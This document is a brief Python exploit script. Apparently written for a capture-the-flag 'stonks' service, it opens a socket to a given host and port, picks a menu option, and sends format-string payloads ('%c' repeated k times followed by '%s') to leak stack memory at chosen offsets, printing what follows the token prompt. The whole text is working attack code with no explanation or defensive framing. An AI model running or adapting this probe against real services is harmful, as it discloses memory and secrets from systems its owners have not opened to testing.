import socket, sys, time

HOST, PORT = sys.argv[1], int(sys.argv[2])
KS = [int(x) for x in sys.argv[3].split(",")]


def probe(k):
    payload = ("%c" * k + "|%s|").encode()
    s = socket.create_connection((HOST, PORT), timeout=15)
    s.settimeout(4)
    time.sleep(0.25)
    try:
        s.recv(4096)
    except Exception:
        pass
    s.sendall(b"1\n")
    time.sleep(0.35)
    try:
        s.recv(4096)
    except Exception:
        pass
    s.sendall(payload + b"\n")
    time.sleep(0.4)
    out = b""
    try:
        while True:
            d = s.recv(8192)
            if not d:
                break
            out += d
            if len(out) > 20000:
                break
    except Exception:
        pass
    s.close()
    seg = out.split(b"Buying stonks with token:")[-1]
    return seg[:300]


for k in KS:
    print("k=%d (rang %d) ->" % (k, k + 1), probe(k))
    print()
